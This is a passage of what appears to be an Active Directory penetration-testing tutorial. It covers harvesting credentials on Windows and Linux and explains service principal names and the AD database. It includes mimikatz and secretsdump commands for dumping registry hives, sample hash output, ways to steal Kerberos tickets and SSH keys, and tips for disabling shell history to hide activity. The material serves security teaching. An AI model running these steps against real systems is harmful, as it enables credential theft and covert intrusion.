 perform a Pass-The-Hash, but you can still try to <a href="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials">crack them</a> in order to
 retrieve the user password.</p>
</div>
</div>
<div id="outline-container-sam" class="outline-6">
<h6 id="sam">
SAM
</h6>
<div id="outline-text-sam" class="outline-text-6">
<p>
 And the other place where there are credentials is the <a href="https://en.wikipedia.org/wiki/Security_Account_Manager">SAM</a> hive file, that
 contains the NT hashes of the local users of the computer. This could be useful
 since sometimes organizations set the same local Administrator password in
 the domain computers.</p>
</div>
</div>
<div id="outline-container-dumping-registry-credentials" class="outline-6">
<h6 id="dumping-registry-credentials">
Dumping registry credentials
</h6>
<div id="outline-text-dumping-registry-credentials" class="outline-text-6">
<p>
 To get the credentials from the SECURITY and SAM hives, you can read them from
 memory by using mimikatz.</p>
<p>
 First you will need to execute <code>token::elevate</code> to acquire a <code class="verbatim">SYSTEM</code> session,
 that allows you to read the credentials. Also execute <code>privilege::debug</code> if
 required to enable the SeDebugPrivilege.</p>
<p>
 Then, you can execute the following commands that will retrieve the different
 credentials:</p>
<ul>
<li><code>lsadump::secrets</code>: Get the LSA secrets.</li>
<li><code>lsadump::cache</code>: Retrieve the cached domain logons.</li>
<li><code>lsadump::sam</code>: Fetch the local account credentials.</li>
</ul>
<p>An alternative is to save a copy of the hive files with <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-save">reg save</a> command, move
 them to our machine, and finally to get the content with <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py">impacket secretsdump</a>
 script or mimikatz. </p>
<p>
 First you need to dump the registry hives. You will need the SECURITY and SAM
 hive files and also the SYSTEM hive since it contains the system Boot Key (or
 System Key) that allows to decrypt the SECURITY and SAM hives.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>C:\&gt;reg save HKLM\SYSTEM system.bin
</span></span><span style="display:flex;"><span>The operation completed successfully.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>C:\&gt;reg save HKLM\SECURITY security.bin
</span></span><span style="display:flex;"><span>The operation completed successfully.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>C:\&gt;reg save HKLM\SAM sam.bin
</span></span><span style="display:flex;"><span>The operation completed successfully.</span></span></code></pre></div>
</div>
<figcaption>
reg command to save registry hives
</figcaption>
</figure>
<p>
 Once the hives were saved, then move then to your local machine and dump them
 with secretsdump:</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ secretsdump.py -system system.bin -security security.bin -sam sam.bin  LOCAL
</span></span><span style="display:flex;"><span>Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[*] Target system bootKey: 0xb471eae0e93128b9c8d5780c19ac9f1d
</span></span><span style="display:flex;"><span>[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style="display:flex;"><span>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style="display:flex;"><span>WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6535b87abdb112a8fc3bf92528ac01f6:::
</span></span><span style="display:flex;"><span>user:1001:aad3b435b51404eeaad3b435b51404ee:57d583aa46d571502aad4bb7aea09c70:::
</span></span><span style="display:flex;"><span>[*] Dumping cached domain logon information (domain/username:hash)
</span></span><span style="display:flex;"><span>CONTOSO.LOCAL/anakin:$DCC2$10240#anakin#2933cad9235d2f502d7bedc2016e6553
</span></span><span style="display:flex;"><span>CONTOSO.LOCAL/han:$DCC2$10240#han#4a52a6d0d7f3590c68124f4d5f7ef285
</span></span><span style="display:flex;"><span>[*] Dumping LSA Secrets
</span></span><span style="display:flex;"><span>[*] $MACHINE.ACC 
</span></span><span style="display:flex;"><span>$MACHINE.ACC:plain_password_hex:59aa6b91e74a0a6fc40efee9f2fb07936a9d69f46397dee82d3ec6ca4d0c01a0293d79e5c040bf564b7938d6c25597816921ec614ad25933af6a2482a8ace4d1dd54dd4bb465384b30046d85f65083e885455ec5f01dcae30df619e3f944eaa008a09e0f7432981f7cdb8dea34e432f00ed92e1ae3e48111326deb2d0f9a6e7d868e24c840b8814d338a4165f90381a4a6b824addb4f71c5908cac4423a4efbc5a4d846c09245930b526a6bec8c678ca838a005dcf5014f8b18426c3e0dbd3921f82c57e6ca025d0258d4536a9e0b68b90ff26c054c992c84d11e95f78c55ca411ee0e5b412cb4fc0f08c28ca2d79996
</span></span><span style="display:flex;"><span>$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:b13dae64def5f205f382a0ab4174eb85
</span></span><span style="display:flex;"><span>[*] DefaultPassword 
</span></span><span style="display:flex;"><span>(Unknown User):user
</span></span><span style="display:flex;"><span>[*] DPAPI_SYSTEM 
</span></span><span style="display:flex;"><span>dpapi_machinekey:0x6880eb76862df7875705885938102c696717eb18
</span></span><span style="display:flex;"><span>dpapi_userkey:0x828326418633117212de44bcda10806fc6765d4a
</span></span><span style="display:flex;"><span>[*] NL$KM 
</span></span><span style="display:flex;"><span> 0000   0B BC 2E DB A1 A7 E2 42  56 6D B8 4B 5A 37 79 A4   .......BVm.KZ7y.
</span></span><span style="display:flex;"><span> 0010   53 51 75 6D 64 7F 9A BF  DC BF C2 83 F4 64 02 A6   SQumd........d..
</span></span><span style="display:flex;"><span> 0020   5E E8 53 AB E5 4B 35 A4  5B 19 7E 97 E0 CA 32 6C   ^.S..K5.[.~...2l
</span></span><span style="display:flex;"><span> 0030   77 68 E8 F1 C0 54 AD 7B  03 F7 BE 59 2E 59 C3 93   wh...T.{...Y.Y..
</span></span><span style="display:flex;"><span>NL$KM:0bbc2edba1a7e242566db84b5a3779a45351756d647f9abfdcbfc283f46402a65ee853abe54b35a45b197e97e0ca326c7768e8f1c054ad7b03f7be592e59c393
</span></span><span style="display:flex;"><span>[*] _SC_mysql 
</span></span><span style="display:flex;"><span>(Unknown User):Solo1234!
</span></span><span style="display:flex;"><span>[*] Cleaning up...</span></span></code></pre></div>
</div>
<figcaption>
Secretsdump usage to dump
</figcaption>
</figure>
<p>
 The <code class="verbatim">Dumping cached domain logon information</code> section contains the Domain Cached
 Credentials. In order to <a href="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials">crack them</a>, you need to saved them in format
 <code class="verbatim">$DCC2$10240#username#hash</code>, then you can use <a href="https://hashcat.net/">hashcat</a>.</p>
<p>
 The section <code class="verbatim">$MACHINE.ACC</code> contains the computer account password (encoded in
 hexadecimal), as well the NT hash.</p>
<p>
 The section <code class="verbatim">DefaultPassword</code> contains the Auto-logon password. In order to get
 the domain and username, you need to check the <code class="verbatim">DefaultDomainName</code> and
 <code class="verbatim">DefaultUserName</code> entries of the
 <code class="verbatim">HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code> registry key.</p>
<p>
 The <code class="verbatim">DPAPI_SYSTEM</code> section contains the master DPAPI keys of the system. These
 keys allow to <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dpapi-extracting-passwords">decrypt the user files</a>. </p>
<p>
 The <code class="verbatim">NK$LM</code> give us the <a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/dumping-lsa-secrets-on-nt5-x64/">key used to encrypt the Domain Cached Credentials</a>, but
 since secretsdump already decrypt them is only for informational purposes.</p>
<p>
 Finally, the entries with format <code class="verbatim">_SC_&lt;service&gt;</code> are the ones that indicates the
 password of users that are running services. In this case, the <code class="verbatim">mysql</code> service.
 We don't know the username of the service user, but we can check it in the computer.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; Get-WmiObject win32_service -Filter <span style="color:#e6db74">"name='mysql'"</span> | select -ExpandProperty startname
</span></span><span style="display:flex;"><span>CONTOSO\han</span></span></code></pre></div>
</div>
<figcaption>
Show user account that runs the mysql service
</figcaption>
</figure>
</div>
</div>
</div>
</div>
<div id="outline-container-powershell-history" class="outline-5">
<h5 id="powershell-history">
Powershell history
</h5>
<div id="outline-text-powershell-history" class="outline-text-5">
<p>
Apart from the LSASS process and registry, you can also search for credentials
in other places like the Powershell history of users. You can use the following
commands to locate and read the Powershell history.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>(Get-PSReadlineOption).HistorySavePath</span></span></code></pre></div>
</div>
<figcaption>
Get the Powershell history path of the current users.
</figcaption>
</figure>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span></span></code></pre></div>
</div>
<figcaption>
Check the Powershell history of all users
</figcaption>
</figure>
<p>
Also, as a tip, you may want to use the following command to avoid storing your
own commands in the Powershell history.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Set-PSReadlineOption -HistorySaveStyle SaveNothing</span></span></code></pre></div>
</div>
<figcaption>
Disabling Powershell history
</figcaption>
</figure>
</div>
</div>
<div id="outline-container-other-places-to-find-credentials-in-windows" class="outline-5">
<h5 id="other-places-to-find-credentials-in-windows">
Other places to find credentials in Windows
</h5>
<div id="outline-text-other-places-to-find-credentials-in-windows" class="outline-text-5">
<p>
Moreover, you can also search for credentials in scripts or configuration files
located in the computer. There are also a lot of software like browsers that
stores credentials that could be useful in a pentest, to check a good list of
software that stores its credentials you can check the <a href="https://github.com/AlessandroZ/LaZagne">LaZagne project</a>.</p>
<p>
Alternatively, in a pentest or red team engagement, you could also use another
techniques to get credentials like set <a href="https://www.tarlogic.com/en/blog/how-to-create-keylogger-in-powershell/">keyloggers</a> or fake <a href="https://adsecurity.org/?p=1760">SSP modules</a>.</p>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="outline-container-linux-computers" class="outline-3">
<h3 id="linux-computers">
Linux computers
</h3>
<div id="outline-text-linux-computers" class="outline-text-3">
<div id="outline-container-linux-computers-discovery" class="outline-4">
<h4 id="linux-computers-discovery">
Linux computers discovery
</h4>
<div id="outline-text-linux-computers-discovery" class="outline-text-4">
<p>
In order to discovery Linux computers in a domain you can also <a href="#windows-computers-discovery">query to the
domain database just like with the Windows computers</a> by using LDAP in case you
have domain credentials.</p>
<p>
In other case, can be a little more difficult since Linux computers don't have
any characteristic port opened by default, however many Linux machines are used
as servers that are remotely administrate. In order to administrate Linux
computers, usually the <a href="#SSH">SSH</a> protocol is used. The SSH server service listens in
the port 22 so you can perform a scan to this port in the network in order to
identify Linux machines.</p>
</div>
</div>
<div id="outline-container-linux-computers-connection" class="outline-4">
<h4 id="linux-computers-connection">
Linux computers connection
</h4>
<div id="outline-text-linux-computers-connection" class="outline-text-4">
<p>
In order to connect to a Linux machine to get a shell in it, the most common
option is to use <a href="#SSH">SSH</a>. Sometimes you may even could use <a href="#powershell-remoting">Powershell remoting</a>,
since it can work over SSH.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ ssh root@debian10 
</span></span><span style="display:flex;"><span>root@192.168.100.137's password: 
</span></span><span style="display:flex;"><span>Linux debian10 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
</span></span><span style="display:flex;"><span>the exact distribution terms for each program are described in the
</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span style="display:flex;"><span>permitted by applicable law.
</span></span><span style="display:flex;"><span>Last login: Fri May  7 12:55:20 2021 from 192.168.100.137
</span></span><span style="display:flex;"><span>root@debian10:~#</span></span></code></pre></div>
</div>
<figcaption>
SSH connection to a Linux machine
</figcaption>
</figure>
<p>
Apart from using username and password, you may can connect by using an SSH key
that <a href="#ssh-keys">you may can grab from another machine</a>.</p>
<figure>
<div class="src src-bash">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ssh -i id_ed25519_foo_key foo@db.contoso.local</span></span></code></pre></div>
</div>
<figcaption>
Connecting to another machine with an SSH key.
</figcaption>
</figure>
<p>
Finally in case the target Linux computer is part of the domain, you may <a href="https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/">be able
to use Kerberos authentication</a> with SSH. You can specify the SSH client to use
Kerberos authentication by enabling the GSSAPI authentication
(<code>-o GSSAPIAuthentication=yes</code>).  You can get a ticket by stolen it
(Pass-The-Ticket), or by requesting it with a NT hash (Overpass-The-Hash) or
Kerberos key (Pass-The-Key). You can use <a href="https://github.com/GhostPack/Rubeus">Rubeus</a>, <a href="https://github.com/Zer1t0/cerbero">cerbero</a> or <a href="https://github.com/SecureAuthCorp/impacket">impacket</a>
to request Kerberos tickets with NT hash or Kerberos keys. </p>
<p>
Moreover, older Linux machines may have <a href="https://en.wikipedia.org/wiki/Telnet">Telnet</a> enabled on port 23. You will need
an username and password to connect to it.</p>
</div>
</div>
<div id="outline-container-linux-computers-credentials" class="outline-4">
<h4 id="linux-computers-credentials">
Linux computers credentials
</h4>
<div id="outline-text-linux-computers-credentials" class="outline-text-4">
<p>
Unfortunately for attackers, Linux doesn't have a lsass process with cached
credentials. But there are many places that can be interesting to look…</p>
<div id="outline-container-linux-kerberos-tickets" class="outline-5">
<h5 id="linux-kerberos-tickets">
Linux Kerberos tickets
</h5>
<div id="outline-text-linux-kerberos-tickets" class="outline-text-5">
<p>
 In order to be authenticate users, the Linux machines usually have a Kerberos
 client that is configured with the domain computer account.  You can find the
 credentials in the keytab, usually found in <code class="verbatim">/etc/krb5.keytab</code>, or in the value
 specified by the environment variables <code class="verbatim">KRB5_KTNAME</code> or <code class="verbatim">KRB5_CLIENT_KTNAME</code>, or
 specified in the <a href="https://web.mit.edu/kerberos/krb5-1.12/doc/admin/conf_files/krb5_conf.html">Kerberos configuration file</a> in <code class="verbatim">/etc/krb5.conf</code>. You can
 display its contents, including the keys, with <code>klist</code> command, or <a href="https://github.com/Zer1t0/cerbero">cerbero</a>.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ klist -k -Ke
</span></span><span style="display:flex;"><span>Keytab name: FILE:/etc/krb5.keytab
</span></span><span style="display:flex;"><span>KVNO Principal
</span></span><span style="display:flex;"><span>---- --------------------------------------------------------------------------
</span></span><span style="display:flex;"><span>   1 r2d2@contoso.local (DEPRECATED:arcfour-hmac)  (0xc49a77fafad6d3a9270a8568fa453003)</span></span></code></pre></div>
</div>
<figcaption>
Displaying the accounts in the default keytab
</figcaption>
</figure>
<p>
 In this case there is a configured account with the NT hash (that is used in
 RC4-HMAC algorithm of Kerberos). You can use the keys stored to <a href="https://www.tarlogic.com/en/blog/how-to-attack-kerberos/">ask for a
 Kerberos ticket</a> an impersonate the user.</p>
<p>
 Additionally, when a domain user is authenticated in the machine, a Kerberos
 ticket is retrieved. You can take these tickets and impersonate the users in the
 domain. You can normally find the tickets under the <code class="verbatim">/tmp</code> directory in files
 with the format <code class="verbatim">krb5cc_%{uid}</code> where uid is the <a href="https://linuxhandbook.com/uid-linux/">user UID</a>. However, it is
 also possible that tickets are stored in the <a href="https://man7.org/linux/man-pages/man7/keyrings.7.html">Linux kernel keys</a> instead of files,
 but you can grab them and convert to files by using <a href="https://github.com/TarlogicSecurity/tickey">tickey</a>. Once you have the
 ticket files, you can use them to perform a Pass the ticket attack.</p>
<figure>
<div class="src src-bash">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ls /tmp/ | grep krb5cc
</span></span><span style="display:flex;"><span>krb5cc_1000
</span></span><span style="display:flex;"><span>krb5cc_1569901113
</span></span><span style="display:flex;"><span>krb5cc_1569901115</span></span></code></pre></div>
</div>
<figcaption>
Tickets in Linux
</figcaption>
</figure>
<p>
 In order to be sure <a href="https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html">where the tickets are stored</a> in a Linux machine, you can
 check the <a href="https://web.mit.edu/kerberos/krb5-1.12/doc/admin/conf_files/krb5_conf.html">Kerberos configuration file</a> in <code class="verbatim">/etc/krb5.conf</code>.</p>
</div>
</div>
<div id="outline-container-linux-user-files" class="outline-5">
<h5 id="linux-user-files">
Linux user files
</h5>
<div id="outline-text-linux-user-files" class="outline-text-5">
<p>
Apart from that, you can get the credentials stored in the <code class="verbatim">/etc/shadow</code> file
that contains the local users passwords. Then you can try to <a href="https://techglimpse.com/cracking-linux-password-hashes-with-hashcat/">crack them by using
hashcat</a>. Sometimes passwords are reused across machines. however you cannot
perform a Pass-The-Hash attack since in order to remotely authenticate against a
Linux machine, using <a href="#ssh">SSH</a> for example, you require the password.</p>
</div>
</div>
<div id="outline-container-ssh-keys" class="outline-5">
<h5 id="ssh-keys">
SSH keys
</h5>
<div id="outline-text-ssh-keys" class="outline-text-5">
<p>
Another possibility is to search for <a href="#ssh">SSH</a> private keys, usually stored in the
<code class="verbatim">.ssh</code> directory of the users directory. The name of the file is usually
<code class="verbatim">id_rsa</code> or <code class="verbatim">id_ed25519</code>. </p>
<figure>
<div class="src src-bash">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ file .ssh/id_ed25519
</span></span><span style="display:flex;"><span>.ssh/id_ed25519: OpenSSH private key</span></span></code></pre></div>
</div>
<figcaption>
Private key identification
</figcaption>
</figure>
<p>
In case the private key doesn't require a passphrase for using it, then you may
can use it to connect to another machines in the domain.</p>
<figure>
<div class="src src-bash">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ssh -i id_ed25519_foo_key foo@db.contoso.local</span></span></code></pre></div>
</div>
<figcaption>
Connecting to another machine with the SSH key.
</figcaption>
</figure>
<p>
Furthermore, if you can find the <code class="verbatim">known_hosts</code> file in <code class="verbatim">.ssh</code> directory, and you
are lucky, it may show you the hostnames of the machines that are connected
through ssh by using the private keys. However, this file can contain the names
hashed, but you can <a href="https://github.com/chris408/known_hosts-hashcat">crack them with hashcat</a>. To create a wordlist of hostnames
you could query the hostnames of the machines in the domain.</p>
</div>
</div>
<div id="outline-container-bash-history" class="outline-5">
<h5 id="bash-history">
Bash history
</h5>
<div id="outline-text-bash-history" class="outline-text-5">
<p>
Additionally, you may find more information about ssh connections and other stuff
like credentials in the command history of the machine users, usually located in
the <code class="verbatim">.bash_history</code> file of the user directory.</p>
<p>
By the way, if you want to avoid letting your commands logged in the history,
you can unset the <code class="verbatim">HISTFILE</code> environment variable or using a <a href="https://www.if-not-true-then-false.com/2010/quit-bash-shell-without-saving-bash-history/">similar</a> <a href="https://www.cyberciti.biz/faq/disable-bash-shell-history-linux/">method</a>.</p>
<figure>
<div class="src src-bash">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>unset HISTFILE</span></span></code></pre></div>
</div>
<figcaption>
Disable bash history
</figcaption>
</figure>
</div>
</div>
<div id="outline-container-other-places-to-find-credentials-in-linux" class="outline-5">
<h5 id="other-places-to-find-credentials-in-linux">
Other places to find credentials in Linux
</h5>
<div id="outline-text-other-places-to-find-credentials-in-linux" class="outline-text-5">
<p>
Likewise, you may be able to find passwords and keys to connect to different
services (like databases) and machines in configuration files of the software
or scripts located in the machine.</p>
<p>
Moreover, you can check the <a href="https://github.com/AlessandroZ/LaZagne">LaZagne project</a> for more software that can be
susceptible of credential stealing.</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="outline-container-services" class="outline-2">
<h2 id="services">
Services
</h2>
<div id="outline-text-services" class="outline-text-2">
<p>
In a domain many machines are used to offer services to the users, so it is
necessary for Active Directory to keep a track of those services in order to
allow the users to find and authenticate against them.</p>
<p>
Active Directory service can be tricky since is not the same as a computer
service. A service in Windows or Linux machine can be understood as a background
process that is continuously executing a task, for example a database. However
it is not necessary for a computer service to be listening on a port, like for
example a service that checks for available updates for the system. </p>
<p>
On the other hand, an Active Directory service is an identifier that indicates
what remote services are or can be available (listening on a port) on a machine.
Not all the remote services are registered in the domain database, however, the
registration is required for those services that need to authenticate domain
users through Kerberos.</p>
<p>
Each registered service in Active Directory provides the following information:</p>
<ul>
<li>The <strong>user</strong> that runs the computer service.</li>
<li>The <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc772815(v=ws.10)#service-principal-names">service class</a>, that indicates what kind of service is, for example web
servers are registered like www class.</li>
<li>The <strong>machine</strong> where the service is hosted.</li>
<li>(Optional) The service <strong>port</strong> on the machine.</li>
<li>(Optional) A <strong>path</strong> for the service.</li>
</ul>
<p>In order to store this information, each service is identified by an
<a href="https://en.hackndo.com/service-principal-name-spn/">Service Principal Name</a> (SPN), which has the following format:</p>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>service_class/machine_name[:port][/path]</span></span></code></pre></div>
</div>
<p>
The machine_name can be the hostname or the <a href="https://en.wikipedia.org/wiki/Fully_qualified_domain_name">FQDN</a> (Fully Qualified Domain Name:
the hostname and domain name joined). It is normal that both formats are stored
for Kerberos compatibility. For example:</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>ldap/DC01
</span></span><span style="display:flex;"><span>ldap/dc01.contoso.local</span></span></code></pre></div>
</div>
<figcaption>
LDAP service SPNs
</figcaption>
</figure>
<p>
The SPN will be stored in a user (or computer) object, that way the service user
can be identified.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; Get-ADComputer ws01-<span style="color:#ae81ff">10</span> -Properties ServicePrincipalName | select -ExpandProperty ServicePrincipalName
</span></span><span style="display:flex;"><span>TERMSRV/WS01-<span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>TERMSRV/ws01-<span style="color:#ae81ff">10</span>.contoso.local
</span></span><span style="display:flex;"><span>RestrictedKrbHost/ws01-<span style="color:#ae81ff">10</span>.contoso.local
</span></span><span style="display:flex;"><span>HOST/ws01-<span style="color:#ae81ff">10</span>.contoso.local
</span></span><span style="display:flex;"><span>RestrictedKrbHost/WS01-<span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>HOST/WS01-<span style="color:#ae81ff">10</span></span></span></code></pre></div>
</div>
<figcaption>
services of ws01-10 computer
</figcaption>
</figure>
<p>
It also important to note that even if the service is currently not being
executed, it can be still registered in the Active Directory database. This is
important cause old services can lead to account takeover by using <a href="https://www.youtube.com/watch?v=PUyhlN-E5MU">Kerberoast</a>.</p>
<p>
To sum up Kerberoast, you can ask for a Kerberos ticket for any service
registered in the domain. The Kerberos ticket for the service will have a part
encrypted with the service user secret (that can be the NT hash or Kerberos
keys) derived from the password. Then you can <a href="https://www.tarlogic.com/en/blog/how-to-attack-kerberos/">save the ticket and try to crack
it</a> to recover the user password. For computer services this is unfeasible cause
the password is too complex, but for user services that can have a weak password
this could be possible to achieve.</p>
<div id="outline-container-host-service" class="outline-3">
<h3 id="host-service">
Host service
</h3>
<div id="outline-text-host-service" class="outline-text-3">
<p>
Moreover, because by default Windows systems deploy a lot of services, in the
machines by default a <a href="https://en.hackndo.com/service-principal-name-spn/#edge-case---host">HOST</a> service class is registered. That <code class="verbatim">HOST</code> class is
an alias for several services.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\Administrator&gt; Get-ADObject -Identity <span style="color:#e6db74">"CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,</span>$((Get-ADDomain).DistinguishedName)<span style="color:#e6db74">"</span> -properties sPNMappings
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>DistinguishedName <span style="color:#960050;background-color:#1e0010">:</span> CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=contoso,DC=local
</span></span><span style="display:flex;"><span>Name              <span style="color:#960050;background-color:#1e0010">:</span> Directory Service
</span></span><span style="display:flex;"><span>ObjectClass       <span style="color:#960050;background-color:#1e0010">:</span> nTDSService
</span></span><span style="display:flex;"><span>ObjectGUID        <span style="color:#960050;background-color:#1e0010">:</span> 70502b18-<span style="color:#ae81ff">010f</span>-4d33-bbb9-ff85a88c6156
</span></span><span style="display:flex;"><span>sPNMappings       <span style="color:#960050;background-color:#1e0010">:</span> {host=alerter,appmgmt,cisvc,clipsrv,browser,dhcp,dnscache,replicator,eventlog,eventsystem,policyage
</span></span><span style="display:flex;"><span>                    nt,oakley,dmserver,dns,mcsvc,fax,msiserver,ias,messenger,netlogon,netman,netdde,netddedsm,nmagent,p
</span></span><span style="display:flex;"><span>                    lugplay,protectedstorage,rasman,rpclocator,rpc,rpcss,remoteaccess,rsvp,samss,scardsvr,scesrv,seclog
</span></span><span style="display:flex;"><span>                    on,scm,dcom,cifs,spooler,snmp,schedule,tapisrv,trksvr,trkwks,ups,time,wins,www,http,w3svc,iisadmin,
</span></span><span style="display:flex;"><span>                    msdtc}</span></span></code></pre></div>
</div>
<figcaption>
Services classes identified by HOST
</figcaption>
</figure>
</div>
</div>
</div>
</div>
<div id="outline-container-database" class="outline-2">
<h2 id="database">
Database
</h2>
<div id="outline-text-database" class="outline-text-2">
<p>
We have been talking about the domain database and some objects that are stored
in it, such as users, groups or services. Let's see now more details about the
database.</p>
<p>
Firstly, the physical location of the database is the <code class="verbatim">C:\Windows\NTDS\ntds.dit</code>
file, located in the Domain Controllers. Each Domain Controller has its own NTDS
file and synchronization between Domain Controllers is required in order to keep
the database up to date.</p>
<div id="outline-container-classes" class="outline-3">
<h3 id="classes">
Classes
</h3>
<div id="outline-text-classes" class="outline-text-3">
<p>
But let's talk about the database structure. The Active Directory database has
an <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc773309(v=ws.10)">schema</a> that defines different <a href="https://docs.microsoft.com/en-us/windows/win32/adschema/classes">object classes</a>. Each class have different
properties and serves for different purposes. For example, there is the
<a href="https://docs.microsoft.com/en-us/windows/win32/adschema/c-user">User class</a>, the <a href="https://docs.microsoft.com/en-us/windows/win32/adschema/c-computer">Computer class</a> or the <a href="https://docs.microsoft.com/en-us/windows/win32/adschema/c-group">Group class</a>.</p>
<p>
Moreover, a class can be the subclass of a parent class, that allows to inherit
properties. For example, the Computer class is a subclass of User class,
therefore the computer objects can have the same properties of the user objects
,like <code class="verbatim">SAMAccountName</code>, and some new custom properties, like <code class="verbatim">OperatingSystem</code>.</p>
<p>
All the classes are subclasses of the <a href="https://docs.microsoft.com/en-us/windows/win32/adschema/c-top">Top</a> class, that defines the essential
properties like <code class="verbatim">ObjectClass</code> or <code class="verbatim">ObjectGUID</code>.</p>
<p>
The <code class="verbatim">ObjectClass</code> property contains a list of the classes of an object, that
is its current class and all of the parent classes.</p>
<p>
